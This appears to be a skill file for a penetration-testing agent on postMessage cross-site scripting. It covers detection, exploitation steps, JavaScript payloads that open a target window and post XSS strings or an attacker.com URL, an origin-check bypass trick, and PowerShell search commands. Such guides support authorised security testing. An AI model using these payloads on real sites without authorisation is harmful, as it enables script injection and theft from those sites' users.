---
name: postmessage
description: postMessage XSS and security analysis — wildcard origin misuse, missing origin checks, message spoofing, and DOM XSS via event handlers. Use when the app uses window.postMessage between parent/iframe windows or embeds third-party iframes.
category: client-side
---

# postMessage XSS

## Detection
- Find `postMessage(` and `addEventListener('message',` in JS bundles (use javascript-deep-analysis).
- Identify handlers that use `event.data` without validating `event.origin`.
- Flag `targetOrigin: '*'` and handlers reading `event.data` into innerHTML/eval/URLs.

## Exploitation
1. **Wildcard targetOrigin**: `otherWindow.postMessage(payload,'*')` → any window receives data.
2. **Missing origin check**: handler doesn't verify `e.origin` → attacker page can `iframe` the app and send crafted messages:
```js
var win = window.open('https://target/');
window.addEventListener('message', f);
win.postMessage('<img src=x onerror=alert(1)>', '*');
```
3. **Origin check bypass**: checks against `location.href`/`e.origin.indexOf('target.com')` (prefix match) → spoof with `attacker.com/target.com`.
4. **Sensitive handler**: handler takes message-controlled URL → `location.href = event.data` (open redirect) or fetches attacker URL (SSRF).
5. **DOM XSS sink**: `event.data` → `innerHTML`, `document.write`, `eval`, `insertAdjacentHTML`.

## Payloads
```js
// deliver from attacker-controlled page that embeds/opens target
var w = window.open('https://target/app');
w.postMessage('<svg onload=alert(document.domain)>', '*');
w.postMessage('javascript:alert(1)', '*');
w.postMessage('{"url":"https://attacker.com/x"}', '*');
```

## Tool Commands (Windows)
```powershell
# extract message handlers from JS
Select-String -Pattern "addEventListener\(['\"]message['\"]" -Path "app.js"
Select-String -Pattern "postMessage\([^)]*" -Path "app.js"
```

## Verification & Evidence
- XSS executes in the target origin via attacker-supplied message (prove with screenshot/alert + origin).
- Evidence: attacker HTML + the handler code + proof of execution.